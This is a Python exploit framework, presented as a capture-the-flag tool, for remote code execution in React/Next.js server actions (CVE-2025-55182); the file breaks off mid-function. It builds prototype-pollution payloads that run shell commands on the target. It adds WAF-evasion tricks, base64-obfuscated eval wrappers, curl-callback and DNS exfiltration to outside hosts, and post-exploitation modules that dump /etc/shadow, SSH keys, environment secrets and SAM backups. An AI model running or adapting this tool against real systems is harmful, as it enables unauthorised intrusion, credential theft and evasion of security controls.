#!/usr/bin/env python3
"""
React2Shell Advanced v2 — CVE-2025-55182 CTF Framework
Deep research-based implementation with dual payload strategies,
safe probing, WAF bypass, multi-channel exfil, and auto-escalation.
"""
import sys,os,re,time,random,string,base64,json,readline,socket
from datetime import datetime
from urllib.parse import urlparse,unquote,quote
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("pip install requests");sys.exit(1)

R='\033[91m';G='\033[92m';Y='\033[93m';B='\033[94m';M='\033[95m';C='\033[96m';W='\033[0m';BOLD='\033[1m';DIM='\033[2m'
UA_POOL=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/18.2 Safari/605.1.15",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"]
DEBUG=False
def dbg(m):
    if DEBUG:print(f"{DIM}  [DBG] {m}{W}")
def ue(s):
    return ''.join(f'\\u{ord(c):04x}' for c in s)

def resolve_domain(ip):
    """Try reverse DNS + forward lookups to find domain for an IP."""
    domains=[]
    try:
        host,_,_=socket.gethostbyaddr(ip)
        if host and host!=ip:domains.append(host)
    except:pass
    try:
        results=socket.getaddrinfo(ip,None)
        for r in results:
            if r[3] and r[3] not in domains and r[3]!=ip:domains.append(r[3])
    except:pass
    return domains

def is_ip(host):
    """Check if string is an IP address."""
    try:socket.inet_aton(host);return True
    except:pass
    try:socket.inet_pton(socket.AF_INET6,host);return True
    except:return False


# ═══════════════════════════════════════════════════════════
# MULTIPART BUILDER
# ═══════════════════════════════════════════════════════════
class MultipartBuilder:
    """Build RFC 2046 multipart bodies with WAF bypass tricks."""
    def __init__(self,bypass=None):
        self.bp=bypass or {}
    def build(self,parts_dict):
        """parts_dict: {name: value_string}. Returns (body_bytes, content_type)."""
        bp=self.bp
        bnd=self._boundary(bp.get('obf_boundary',False))
        le="\r\r\n" if bp.get('extra_cr') else ("\n" if bp.get('lf_only') else "\r\n")
        cd=''.join(c.upper() if random.choice([0,1]) else c.lower() for c in "Content-Disposition") if bp.get('rand_case') else "Content-Disposition"
        q="'" if bp.get('single_quotes') else '"'
        sp="\t" if bp.get('tab_ws') else " "
        segs=[]
        # Empty first part
        if bp.get('empty_part'):
            segs.append(f"--{bnd}{le}Content-Disposition: form-data; name=\"__x__{le}{le}{le}")
        # Junk padding
        jkb=bp.get('junk_kb',0)
        if jkb>0:
            n=''.join(random.choices(string.ascii_lowercase,k=10))
            d=''.join(random.choices(string.ascii_letters+string.digits,k=jkb*1024))
            segs.append(f"--{bnd}{le}{cd}:{sp}form-data;{sp}name={q}{n}{q}{le}{le}{d}{le}")
        # Parameter pollution
        if bp.get('pollution'):
            for _ in range(random.randint(2,4)):
                n=random.choice(['action','submit','type','ref'])+str(random.randint(100,999))
                v=''.join(random.choices(string.ascii_letters,k=random.randint(8,20)))
                segs.append(f"--{bnd}{le}{cd}:{sp}form-data;{sp}name={q}{n}{q}{le}{le}{v}{le}")
        # Actual parts
        for name,val in parts_dict.items():
            disp=f"{cd}:{sp}form-data;{sp}name={q}{name}{q}"
            if bp.get('dup_name'):
                disp+=f";{sp}name={q}{''.join(random.choices(string.ascii_lowercase,k=5))}{q}"
            if bp.get('line_fold'):
                disp=disp.replace(f";{sp}name",f";{le} name",1)
            segs.append(f"--{bnd}{le}{disp}{le}{le}{val}{le}")
        if not bp.get('missing_boundary'):
            segs.append(f"--{bnd}--")
        body="".join(segs).encode('utf-8')
        # Content-Type
        bparam=f"boundary={bnd}"
        if bp.get('boundary_semi'):bparam+=";"
        if bp.get('boundary_pad'):bparam=f"boundary= {bnd} "
        ct=f"multipart/form-data; {bparam}"
        cs=bp.get('charset')
        CHARSETS={'utf16le':'utf-16le','utf16be':'utf-16be','utf7':'utf-7','utf32':'utf-32','ibm037':'ibm037'}
        if cs=='double':ct+="; charset=utf-8; charset=utf-7"
        elif cs and cs in CHARSETS:ct+=f"; charset={CHARSETS[cs]}"
        return body,ct

    def _boundary(self,obf):
        if obf:return ''.join(random.choices(string.ascii_letters+string.digits,k=32))
        return "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"


# ═══════════════════════════════════════════════════════════
# PAYLOAD STRATEGIES
# ═══════════════════════════════════════════════════════════
class PayloadStrategy:
    """Generate exploit payloads in different structural variants."""

    @staticmethod
    def js_rce(cmd,exfil='redirect',obf_level=0,**kw):
        """Build the JS code that goes into _prefix."""
        ce=cmd.replace("\\","\\\\").replace("'","\\\\'").replace('"','\\"')
        cwd=kw.pop('cwd',None)
        cwd_opt=''
        if cwd:
            # Use forward slashes — Windows Node.js accepts them, and they
            # don't get eaten by the JSON→JS escaping chain
            cwd_fwd=cwd.replace('\\','/')
            cwd_opt=f",cwd:'{cwd_fwd}'"
        # Build require chain based on obfuscation
        if obf_level==0:
            rce=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000{cwd_opt}}})"
        elif obf_level<=2:
            rce=f"process['main'+'Module']['req'+'uire']('child_'+'process')['exec'+'Sync']('{ce}',{{timeout:8000{cwd_opt}}})"
        else:
            # eval(Buffer.from(b64)) — hides ALL JS from WAF
            inner=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000{cwd_opt}}})"
            inner_full=PayloadStrategy._exfil_wrap(inner,exfil,**kw)
            b=base64.b64encode(inner_full.encode()).decode()
            return f"eval(Buffer.from('{b}','base64').toString())//"
        return PayloadStrategy._exfil_wrap(rce,exfil,**kw)

    @staticmethod
    def js_rce_truncated(cmd,max_bytes=4000,exfil='redirect',obf_level=0,**kw):
        """Like js_rce but truncates output server-side for large commands."""
        ce=cmd.replace("\\","\\\\").replace("'","\\\\'").replace('"','\\"')
        cwd=kw.pop('cwd',None)
        cwd_opt=''
        if cwd:
            cwd_fwd=cwd.replace('\\','/')
            cwd_opt=f",cwd:'{cwd_fwd}'"
        if obf_level==0:
            rce=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000{cwd_opt}}}).toString().substring(0,{max_bytes})"
        elif obf_level<=2:
            rce=f"process['main'+'Module']['req'+'uire']('child_'+'process')['exec'+'Sync']('{ce}',{{timeout:8000{cwd_opt}}}).toString().substring(0,{max_bytes})"
        else:
            inner=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000{cwd_opt}}}).toString().substring(0,{max_bytes})"
            inner_full=PayloadStrategy._exfil_wrap_str(inner,exfil,**kw)
            b=base64.b64encode(inner_full.encode()).decode()
            return f"eval(Buffer.from('{b}','base64').toString())//"
        return PayloadStrategy._exfil_wrap_str(rce,exfil,**kw)

    @staticmethod
    def _exfil_wrap_str(rce_str_expr,exfil,**kw):
        """Like _exfil_wrap but rce_str_expr already returns a string, not Buffer."""
        if exfil=='redirect':
            return (f"var r=Buffer.from({rce_str_expr}).toString('base64');"
                    f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:'NEXT_REDIRECT;push;/login?a='+r+';307;'}});")
        elif exfil=='redirect_plain':
            return (f"var r={rce_str_expr};"
                    f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:'NEXT_REDIRECT;push;/pwned?output='+encodeURIComponent(r)+';307;'}});")
        elif exfil=='error':
            return (f"var r=Buffer.from({rce_str_expr}).toString('base64');"
                    f"throw new Error('R2S'+r+'END');")
        return PayloadStrategy._exfil_wrap_str(rce_str_expr,'redirect',**kw)

    @staticmethod
    def _exfil_wrap(rce_expr,exfil,**kw):
        if exfil=='redirect':
            return (f"var r={rce_expr}.toString('base64');"
                    f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:'NEXT_REDIRECT;push;/login?a='+r+';307;'}});")
        elif exfil=='redirect_plain':
            return (f"var r={rce_expr}.toString().trim();"
                    f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:'NEXT_REDIRECT;push;/pwned?output='+r+';307;'}});")
        elif exfil=='error':
            return (f"var r={rce_expr}.toString('base64');"
                    f"throw new Error('R2S'+r+'END');")
        elif exfil=='callback':
            cb=kw.get('callback_url','http://127.0.0.1:8080')
            return (f"var r={rce_expr}.toString('base64');"
                    f"process.mainModule.require('child_process').execSync("
                    f"'curl -s -d \"'+r+'\" \"{cb}\"',{{timeout:5000}});"
                    f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:'NEXT_REDIRECT;push;/ok;307;'}});")
        elif exfil=='dns':
            dom=kw.get('dns_domain','x.example.com')
            return (f"var r={rce_expr}.toString('hex').substring(0,60);"
                    f"process.mainModule.require('child_process').execSync("
                    f"'nslookup '+r+'.{dom}',{{timeout:5000}});"
                    f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:'NEXT_REDIRECT;push;/ok;307;'}});")
        return PayloadStrategy._exfil_wrap(rce_expr,'redirect',**kw)

    @staticmethod
    def strategy_A(js_code,json_esc=0):
        """Circulating 3-part PoC: $@0 self-ref + $1:__proto__:then"""
        proto="__proto__"
        constr="constructor"
        if json_esc>=2:
            proto=ue("__proto__")
            constr=ue("constructor")
        elif json_esc>=1:
            proto=ue("__proto__")
        p0=(f'{{"then":"$1:{proto}:then","status":"resolved_model","reason":-1,'
            f'"value":"{{\\"then\\":\\"$B1337\\"}}","_response":{{"_prefix":"{js_code}",'
            f'"_chunks":"$Q2","_formData":{{"get":"$1:{constr}:{constr}"}}}}}}')
        return {"0":p0,"1":'"$@0"',"2":"[]"}

    @staticmethod
    def strategy_B(js_code,json_esc=0):
        """lachlan2k Original 5-part: $@3 + $2:then + map chaining"""
        constr="constructor"
        if json_esc>=1:constr=ue("constructor")
        p0='"$1"'
        p1=json.dumps({
            "status":"resolved_model","reason":0,"_response":"$4",
            "value":json.dumps({"then":"$3:map","0":{"then":"$B3"},"length":1}),
            "then":"$2:then"
        })
        p2='"$@3"'
        p3="[]"
        p4_obj={"_prefix":js_code,"_formData":{"get":f"$3:{constr}:{constr}"},"_chunks":"$2:_response:_chunks"}
        p4=json.dumps(p4_obj)
        if json_esc>=1:
            p4=p4.replace("_prefix",ue("_prefix")).replace("_formData",ue("_formData")).replace("_chunks",ue("_chunks"))
            p1=p1.replace("_response",ue("_response"))
        return {"0":p0,"1":p1,"2":p2,"3":p3,"4":p4}

    @staticmethod
    def safe_probe():
        """Detection probe — triggers 500 + E{"digest" without RCE."""
        return {"0":'["$1:aa:aa"]',"1":"{}"}


# ═══════════════════════════════════════════════════════════
# OUTPUT EXTRACTOR
# ═══════════════════════════════════════════════════════════
class OutputExtractor:
    @staticmethod
    def extract(resp):
        t=resp.text or "";h=resp.headers
        # Redirect headers
        for hn in ['X-Action-Redirect','Location','x-action-redirect']:
            v=h.get(hn,'')
            if not v:continue
            m=re.search(r'[?&]a=([A-Za-z0-9+/=%-]+)',v)
            if m:
                try:
                    d=base64.b64decode(unquote(m.group(1))).decode('utf-8',errors='ignore').strip()
                    if d:return d,f'hdr:{hn}'
                except:pass
            m=re.search(r'output=([^;]+)',v)
            if m:
                d=unquote(m.group(1)).strip()
                if d:return d,f'hdr:{hn}:output'
        # R2S markers in body
        m=re.search(r'R2S(.+?)END',t,re.DOTALL)
        if m:
            raw=m.group(1).strip()
            try:
                d=base64.b64decode(raw).decode('utf-8',errors='ignore').strip()
                if d:return d,'body:r2s'
            except:
                if raw:return raw,'body:r2s_raw'
        # NEXT_REDIRECT digest in body
        for p in [r'NEXT_REDIRECT;push;/login\?a=([A-Za-z0-9+/=%-]+)',
                  r'NEXT_REDIRECT;push;/pwned\?output=([^;]+)',
                  r'[?&]a=([A-Za-z0-9+/=]{8,})']:
            m=re.search(p,t)
            if m:
                try:
                    d=base64.b64decode(unquote(m.group(1))).decode('utf-8',errors='ignore').strip()
                    if d:return d,'body:digest'
                except:
                    d=unquote(m.group(1)).strip()
                    if d and len(d)>1:return d,'body:digest_raw'
        return None,None

    @staticmethod
    def dump(resp):
        lines=[f"  HTTP {resp.status_code} {resp.reason}"]
        for k,v in resp.headers.items():lines.append(f"  {k}: {v}")
        b=resp.text or "(empty)"
        lines.append(f"  Body[{len(b)}b]: {b[:2000]}")
        return '\n'.join(lines)


# ═══════════════════════════════════════════════════════════
# WAF FINGERPRINTER
# ═══════════════════════════════════════════════════════════
PRESETS={
    'none':{},
    'light':{'obf_boundary':True,'empty_part':True},
    'medium':{'junk_kb':32,'obf_boundary':True,'rand_case':True,'empty_part':True},
    'generic':{'junk_kb':64,'obf_boundary':True,'rand_case':True,'pollution':True,'empty_part':True},
    'heavy':{'junk_kb':128,'charset':'utf16le','obf_boundary':True,'rand_case':True,'pollution':True,'empty_part':True,'dup_name':True},
    'aggressive':{'junk_kb':256,'charset':'utf32','obf_boundary':True,'rand_case':True,'pollution':True,'empty_part':True,'dup_name':True,'tab_ws':True,'line_fold':True,'extra_cr':True,'single_quotes':True},
}
WAF_SIGS={'cloudflare':['cf-ray','cloudflare'],'akamai':['akamai'],'aws_waf':['x-amzn','awselb'],'modsecurity':['mod_security'],'imperva':['x-iinfo','incap_ses'],'sucuri':['x-sucuri']}

def fingerprint_waf(session,url):
    try:
        r=session.get(url,timeout=20,verify=False)
        combined=' '.join(f"{k}:{v}" for k,v in r.headers.items()).lower()
        combined+=' '.join(f"{k}={v}" for k,v in r.cookies.items()).lower()
        for waf,sigs in WAF_SIGS.items():
            if any(s in combined for s in sigs):return waf
    except:pass
    return None


# ═══════════════════════════════════════════════════════════
# ADVANCED SHELL
# ═══════════════════════════════════════════════════════════
class AdvancedShell:
    EXFIL_CHS=['redirect','redirect_plain','error','callback','dns']

    # Auto-escalation matrix: (strategy, json_esc, obf_level, bypass_key, exfil)
    ESCALATION=[
        # Start simple — no bypass, just different strategies
        ('A',0,0,'none','redirect'),('B',0,0,'none','redirect'),
        ('A',0,0,'none','redirect_plain'),('B',0,0,'none','redirect_plain'),
        ('A',0,0,'none','error'),('B',0,0,'none','error'),
        # Add Unicode JSON escaping
        ('A',1,0,'none','redirect'),('A',2,0,'none','redirect'),
        ('A',1,0,'none','error'),('A',2,0,'none','error'),
        ('B',1,0,'none','redirect'),('B',1,0,'none','error'),
        # Add JS obfuscation (eval wrapper)
        ('A',0,3,'none','redirect'),('A',1,3,'none','redirect'),
        ('A',2,3,'none','redirect'),('A',2,3,'none','error'),
        ('B',0,3,'none','redirect'),('B',1,3,'none','error'),
        # Add light multipart bypass
        ('A',2,3,'light','redirect'),('A',2,3,'light','error'),
        ('B',1,3,'light','redirect'),('B',1,3,'light','error'),
        # Medium bypass
        ('A',2,3,'medium','redirect'),('A',2,3,'medium','error'),
        # Generic bypass
        ('A',2,3,'generic','redirect'),('A',2,3,'generic','error'),
        # Heavy bypass
        ('A',2,4,'heavy','redirect'),('A',2,4,'heavy','error'),
        # Aggressive
        ('A',2,4,'aggressive','redirect'),('A',2,4,'aggressive','error'),
    ]

    def __init__(self,target,args):
        self.target=target.rstrip('/')
        self.args=args
        self.session=requests.Session()
        self.session.verify=False
        self.timeout=getattr(args,'timeout',90)
        self.current_dir=None
        self.root_mode=False
        self.obf_level=getattr(args,'obfuscate',0)
        self.json_esc=getattr(args,'json_escape',0)
        self.exfil_ch=getattr(args,'exfil','redirect')
        self.strategy=getattr(args,'strategy','A')
        self.stealth=getattr(args,'stealth',False)
        self.callback_url=getattr(args,'callback_url',None)
        self.dns_domain=getattr(args,'dns_domain',None)
        self.bypass_cfg=PRESETS.get(getattr(args,'bypass','none'),{}).copy()
        self.host_header=getattr(args,'host',None)
        self.waf_name=None
        self.last_output=""
        self.target_os=None  # 'windows' or 'linux', auto-detected
        self.truncate=False  # off by default — opt-in via .truncate
        self.hist=os.path.expanduser("~/.r2s_history")
        if getattr(args,'proxy',None):
            self.session.proxies={'http':args.proxy,'https':args.proxy}
        try:readline.read_history_file(self.hist)
        except:pass
        readline.set_history_length(1000)

    def _headers(self):
        h={"User-Agent":random.choice(UA_POOL) if self.stealth else UA_POOL[0],
           "Next-Action":''.join(random.choices(string.hexdigits[:16],k=8)),
           "Accept":"text/x-component, */*","Accept-Language":"en-US,en;q=0.9"}
        if self.host_header:h["Host"]=self.host_header
        if self.stealth:h.update({"Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"})
        return h

    def _send(self,parts_dict,bypass=None,timeout=None):
        """Send multipart payload. Returns (response, error_string)."""
        bp=bypass if bypass is not None else self.bypass_cfg
        tout=timeout or self.timeout
        mb=MultipartBuilder(bp)
        body,ct=mb.build(parts_dict)
        headers=self._headers()
        headers["Content-Type"]=ct
        if self.stealth:time.sleep(random.uniform(0.3,1.5))
        dbg(f"Sending {len(body)}b, ct={ct[:80]}")
        t0=time.time()
        try:
            r=self.session.post(self.target,headers=headers,data=body,timeout=tout,allow_redirects=False)
            dbg(f"HTTP {r.status_code} in {time.time()-t0:.1f}s ({len(r.text or '')}b)")
            return r,None
        except requests.exceptions.Timeout:return None,f"Timeout ({time.time()-t0:.0f}s)"
        except requests.exceptions.ConnectionError as e:return None,f"ConnErr: {e}"
        except Exception as e:return None,str(e)

    def _exploit(self,cmd,strategy=None,json_esc=None,obf=None,exfil=None,bypass=None,timeout=None):
        """Build exploit payload + send + extract output. Returns (output, resp, err)."""
        strat=strategy or self.strategy
        je=json_esc if json_esc is not None else self.json_esc
        ol=obf if obf is not None else self.obf_level
        ch=exfil or self.exfil_ch
        final=cmd
        # Wrapping: bash-style works on both Linux and Windows cmd.exe
        if self.root_mode and self.target_os!='windows':
            b=base64.b64encode(final.encode()).decode()
            final=f'echo {b}|base64 -d|sudo -i 2>&1||true'
        else:
            final=f"({final}) 2>&1||true"
        kw={}
        if ch=='callback' and self.callback_url:kw['callback_url']=self.callback_url
        if ch=='dns' and self.dns_domain:kw['dns_domain']=self.dns_domain
        # Pass cwd via execSync option — avoids backslash escaping issues
        if self.current_dir:kw['cwd']=self.current_dir
        # Use truncated version by default to avoid header overflow
        if self.truncate:
            js=PayloadStrategy.js_rce_truncated(final,4000,ch,ol,**kw)
        else:
            js=PayloadStrategy.js_rce(final,ch,ol,**kw)
        if strat=='B':parts=PayloadStrategy.strategy_B(js,je)
        else:parts=PayloadStrategy.strategy_A(js,je)
        resp,err=self._send(parts,bypass=bypass,timeout=timeout)
        if err:return None,None,err
        out,method=OutputExtractor.extract(resp)
        if out:dbg(f"Extracted via {method}")
        return out,resp,None

    def execute(self,cmd):
        out,resp,err=self._exploit(cmd)
        if out:
            # Auto-detect OS from first successful output
            if self.target_os is None:
                low=out.lower()
                if any(w in low for w in ['volume in drive','windows','\\users\\','c:\\','iis']):
                    self.target_os='windows'
                    dbg('Detected Windows target')
                elif any(w in low for w in ['/bin/','/usr/','/home/','linux','ubuntu','root:']):
                    self.target_os='linux'
                    dbg('Detected Linux target')
            return out
        if err:return f"{R}[-] {err}{W}"
        if resp:return f"{Y}[!] No output (HTTP {resp.status_code}). Output may be too large — try piping: cmd | more{W}"
        return f"{R}[-] No response{W}"

    def safe_probe(self):
        """Non-RCE probe to confirm vulnerability."""
        print(f"{Y}[*] Safe probe (no RCE) — looking for E{{\"digest\" in HTTP 500...{W}")
        parts=PayloadStrategy.safe_probe()
        # Try with no bypass first
        for label,bp in [("vanilla",{}),("obf-boundary",{'obf_boundary':True}),("light",PRESETS['light']),("medium",PRESETS['medium'])]:
            sys.stdout.write(f"  [{label}] ");sys.stdout.flush()
            resp,err=self._send(parts,bypass=bp,timeout=min(45,self.timeout))
            if err:print(f"{R}✗ {err}{W}");continue
            if resp:
                is_vuln=resp.status_code==500 and 'E{"digest"' in (resp.text or '')
                if is_vuln:
                    print(f"{G}✓ VULNERABLE! (HTTP {resp.status_code}, digest in body){W}")
                    return True
                # Even a non-500 response means WAF isn't dropping the connection
                print(f"{Y}⚠ HTTP {resp.status_code} (body: {(resp.text or '')[:100]}){W}")
            else:print(f"{R}✗ no response{W}")
        print(f"\n{Y}  Probe didn't confirm vulnerability. The WAF may be blocking even probe requests.{W}")
        return False

    def raw_test(self,cmd="echo TESTPING"):
        """Send ONE exploit and show full raw response."""
        print(f"{Y}[*] RAW TEST: '{cmd}' strategy={self.strategy} json_esc={self.json_esc} obf=L{self.obf_level} exfil={self.exfil_ch}{W}")
        print(f"    bypass={self.bypass_cfg}  timeout={self.timeout}s{W}")
        t0=time.time()
        out,resp,err=self._exploit(cmd)
        dt=time.time()-t0
        if err:
            print(f"\n{R}  RESULT: {err} (after {dt:.1f}s){W}")
            print(f"{Y}  Server didn't respond. WAF likely dropping connection.{W}")
            print(f"{Y}  Try: .strategy B  or  .jsonesc 2  or  .obf 3{W}")
            return
        if resp:
            print(f"\n{C}═══ RAW RESPONSE ({dt:.1f}s) ═══{W}")
            print(OutputExtractor.dump(resp))
            print(f"{C}══════════════════════════{W}")
        if out:print(f"\n{G}[+] EXTRACTED: {out}{W}")
        else:print(f"\n{Y}[!] Response received but no output extracted.{W}")

    def auto_exploit(self,command):
        total=len(self.ESCALATION)
        print(f"{Y}[*] Auto-escalating through {total} combinations...{W}")
        for i,(strat,je,ol,bpk,ch) in enumerate(self.ESCALATION):
            bp=PRESETS.get(bpk,{})
            label=f"{i+1}/{total} S{strat} je{je} o{ol} {bpk} {ch}"
            sys.stdout.write(f"\r  {Y}[{label}]{W}"+" "*20);sys.stdout.flush()
            out,resp,err=self._exploit(command,strategy=strat,json_esc=je,obf=ol,exfil=ch,bypass=bp,timeout=min(60,self.timeout))
            if out:
                print(f"\r  {G}[✓ {label}] SUCCESS!{W}"+" "*20)
                self.strategy=strat;self.json_esc=je;self.obf_level=ol;self.exfil_ch=ch;self.bypass_cfg=bp.copy()
                print(f"{G}  Locked config{W}")
                return out
            if resp:dbg(f"HTTP {resp.status_code}")
        print(f"\r{R}[-] All {total} combos failed.{W}"+" "*30)
        print(f"{Y}  Try: .rawtest id  |  .safeprobe  |  --exfil callback --callback-url URL{W}")
        return None

    # ═══════════════════════════════════════════════════════
    # POST-EXPLOITATION MODULES
    # ═══════════════════════════════════════════════════════
    def _run_enum(self,label,cmds):
        """Run a list of (section, command) and print results."""
        print(f"{Y}[*] {label}...{W}")
        for section,cmd in cmds:
            o=self.execute(cmd)
            if o and '[-]' not in o and '[!' not in o:
                lines=[x for x in o.strip().split('\n') if 'cannot find the path' not in x.lower()]
                clean='\n'.join(lines).strip()
                if clean:
                    print(f"  {C}--- {section} ---{W}")
                    for line in clean.split('\n'):print(f"  {line}")
            else:
                print(f"  {C}{section}:{W} {R}failed{W}")

    def post_users(self):
        if self.target_os=='windows':
            self._run_enum('User Enumeration',[
                ('Current User','whoami /all'),
                ('Local Users','net user'),
                ('Administrators','net localgroup Administrators'),
                ('Logged In','query user 2>nul || echo N/A'),
            ])
        else:
            self._run_enum('User Enumeration',[
                ('Current User','id'),
                ('All Users','cat /etc/passwd | grep -v nologin | grep -v false'),
                ('Sudo Privs','sudo -l 2>/dev/null || echo N/A'),
                ('Logged In','w 2>/dev/null || who'),
                ('Last Logins','last -n 10 2>/dev/null || echo N/A'),
            ])

    def post_ps(self):
        if self.target_os=='windows':
            self._run_enum('Process List',[
                ('Processes','tasklist /FO TABLE /NH'),
            ])
        else:
            self._run_enum('Process List',[
                ('Processes','ps aux --sort=-%mem | head -30'),
            ])

    def post_net(self):
        if self.target_os=='windows':
            self._run_enum('Network Info',[
                ('Interfaces','ipconfig /all'),
                ('Connections','netstat -an | findstr ESTABLISHED'),
                ('Listening','netstat -an | findstr LISTENING'),
                ('ARP Table','arp -a'),
                ('DNS Cache','ipconfig /displaydns | findstr "Record Name" 2>nul | head 20'),
                ('Routes','route print'),
            ])
        else:
            self._run_enum('Network Info',[
                ('Interfaces','ip addr 2>/dev/null || ifconfig'),
                ('Connections','ss -tunap 2>/dev/null || netstat -tunap 2>/dev/null'),
                ('ARP','ip neigh 2>/dev/null || arp -a'),
                ('Routes','ip route 2>/dev/null || route -n'),
                ('DNS','cat /etc/resolv.conf'),
                ('Hosts',"cat /etc/hosts | grep -v '^#' | grep -v '^$'"),
            ])

    def post_services(self):
        if self.target_os=='windows':
            self._run_enum('Services',[
                ('Running Services','sc query state= running | findstr SERVICE_NAME'),
                ('Startup Services','wmic service where StartMode="Auto" get Name,State /format:list 2>nul'),
            ])
        else:
            self._run_enum('Services',[
                ('Services','systemctl list-units --type=service --state=running 2>/dev/null || service --status-all 2>/dev/null'),
                ('Listening','ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null'),
            ])

    def post_shares(self):
        if self.target_os=='windows':
            self._run_enum('Network Shares',[
                ('Shares','net share'),
                ('Mapped Drives','net use'),
                ('Domain Info','net config workstation | findstr "domain" 2>nul'),
            ])
        else:
            self._run_enum('Network Shares',[
                ('NFS','showmount -e localhost 2>/dev/null || echo N/A'),
                ('SMB','smbclient -L localhost -N 2>/dev/null || echo N/A'),
                ('Mounts','mount | grep -v tmpfs'),
            ])

    def post_firewall(self):
        if self.target_os=='windows':
            self._run_enum('Firewall',[
                ('Profile Status','netsh advfirewall show allprofiles state'),
                ('Inbound Rules','netsh advfirewall firewall show rule name=all dir=in | findstr "Rule Name" | head 30'),
            ])
        else:
            self._run_enum('Firewall',[
                ('IPTables','iptables -L -n 2>/dev/null || echo N/A'),
                ('UFW','ufw status 2>/dev/null || echo N/A'),
            ])

    def post_secrets(self):
        if self.target_os=='windows':
            self._run_enum('Credential Hunting',[
                ('Env Secrets','set | findstr -i "pass key secret token api"'),
                ('WiFi Profiles','netsh wlan show profiles 2>nul'),
                ('Saved Creds','cmdkey /list 2>nul'),
                ('SAM Backup','dir C:\\Windows\\repair\\SAM 2>nul & dir C:\\Windows\\System32\\config\\RegBack\\SAM 2>nul'),
                ('Unattend','dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml C:\\*web.config 2>nul'),
                ('.env Files','dir /s /b C:\\*.env 2>nul | head 20'),
                ('Registry Secrets','reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /f password 2>nul | head 20'),
            ])
        else:
            self._run_enum('Credential Hunting',[
                ('Env Secrets','env | grep -iE "pass|key|secret|token|api" 2>/dev/null'),
                ('SSH Keys','ls -la ~/.ssh/ 2>/dev/null && cat ~/.ssh/id_* 2>/dev/null | head 5'),
                ('History','cat ~/.bash_history 2>/dev/null | grep -iE "pass|key|secret|mysql|ssh" | tail -20'),
                ('Config Files','find / -name "*.conf" -o -name ".env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null | head 20'),
                ('/etc/shadow','cat /etc/shadow 2>/dev/null || echo Permission denied'),
                ('DB Configs','grep -r "password" /etc/ --include="*.conf" 2>/dev/null | head 10'),
            ])

    def post_persist(self):
        if self.target_os=='windows':
            self._run_enum('Persistence Check',[
                ('Scheduled Tasks','schtasks /query /fo TABLE /nh | findstr -v "INFO:" | head 30'),
                ('Startup Registry','reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul'),
                ('User Startup','reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul'),
                ('Startup Folder','dir "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" 2>nul'),
            ])
        else:
            self._run_enum('Persistence Check',[
                ('Crontabs','crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null'),
                ('Systemd Timers','systemctl list-timers 2>/dev/null'),
                ('SUID Binaries','find / -perm -4000 -type f 2>/dev/null | head 20'),
                ('World-Writable','find /etc /usr -writable -type f 2>/dev/null | head 10'),
                ('Bashrc/Profile','cat ~/.bashrc ~/.profile 2>/dev/null | grep -v "^#" | grep -v "^$" | tail -20'),
            ])

    def post_software(self):
        if self.target_os=='windows':
            self._run_enum('Installed Software',[
                ('Programs','wmic product get Name,Version /format:table 2>nul || reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /v DisplayName 2>nul | findstr DisplayName | head 30'),
                ('Patches','wmic qfe get HotFixID,InstalledOn /format:table 2>nul | head 20'),
                ('.NET Version','reg query "HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP" /s /v Version 2>nul | findstr Version'),
                ('Node.js','node -v 2>nul'),
            ])
        else:
            self._run_enum('Installed Software',[
                ('Packages','dpkg -l 2>/dev/null | tail -20 || rpm -qa 2>/dev/null | tail -20'),
                ('Kernel','uname -r'),
                ('Node.js','node -v 2>/dev/null'),
                ('Python','python3 --version 2>/dev/null'),
                ('Compilers','which gcc g++ cc make 2>/dev/null'),
            ])

    def post_cat(self,filepath):
        """Read a file cross-platform."""
        # Convert backslashes to forward slashes for Windows paths
        fp=filepath.replace('\\','/') if self.target_os=='windows' else filepath
        if self.target_os=='windows':
            o=self.execute(f'type "{fp}"')
        else:
            o=self.execute(f'cat "{fp}"')
        if o:print(o)
        else:print(f"{R}Could not read file{W}")

    def post_bg(self,cmd):
        """Run a command in the background (fire & forget, no output)."""
        fp=cmd.replace('\\','/') if self.target_os=='windows' else cmd
        if self.target_os=='windows':
            o=self.execute(f'start /b cmd /c "{fp}" >nul 2>&1 & echo BG_OK')
        else:
            o=self.execute(f'nohup {fp} >/dev/null 2>&1 & echo BG_OK')
        if o and 'BG_OK' in o:print(f"{G}[+] Started in background{W}")
        else:print(f"{Y}[!] Background start result: {o or 'no output'}{W}")

    def post_exec(self,filepath,args=''):
        """Smart executable launcher — tries multiple execution methods."""
        fp=filepath.replace('\\','/') if self.target_os=='windows' else filepath
        # Build full path if relative
        if self.target_os=='windows' and ':' not in fp and not fp.startswith('/') and not fp.startswith('\\\\'):
            cwd=(self.current_dir or '').replace('\\','/')
            full=cwd.rstrip('/')+'/'+fp if cwd else fp
        else:
            full=fp
